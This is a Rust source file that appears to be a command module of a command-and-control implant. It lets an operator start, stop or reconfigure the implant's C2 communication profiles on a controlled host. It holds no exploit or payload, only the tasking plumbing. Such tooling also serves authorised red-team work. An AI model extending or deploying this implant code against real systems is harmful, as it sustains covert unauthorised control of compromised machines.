use crate::profiles;
use crate::structs::Task;
use serde::Deserialize;

#[derive(Deserialize)]
struct UpdateC2Args {
    c2_name: String,
    action: String,
    #[serde(default)]
    config_name: String,
    #[serde(default)]
    config_value: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: UpdateC2Args = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    match args.action.as_str() {
        "start" => {
            profiles::start_c2_profile(&args.c2_name);
            response.user_output = format!("Started {}", args.c2_name);
            response.completed = true;
        }
        "stop" => {
            profiles::stop_c2_profile(&args.c2_name);
            response.user_output = format!("Stopped {}", args.c2_name);
            response.completed = true;
        }
        "update" => {
            profiles::update_c2_profile(&args.c2_name, &args.config_name, &args.config_value);
            response.user_output = format!(
                "Updated {}.{} = {}",
                args.c2_name, args.config_name, args.config_value
            );
            response.completed = true;
        }
        _ => {
            response.set_error(&format!("Unknown action: {}", args.action));
        }
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
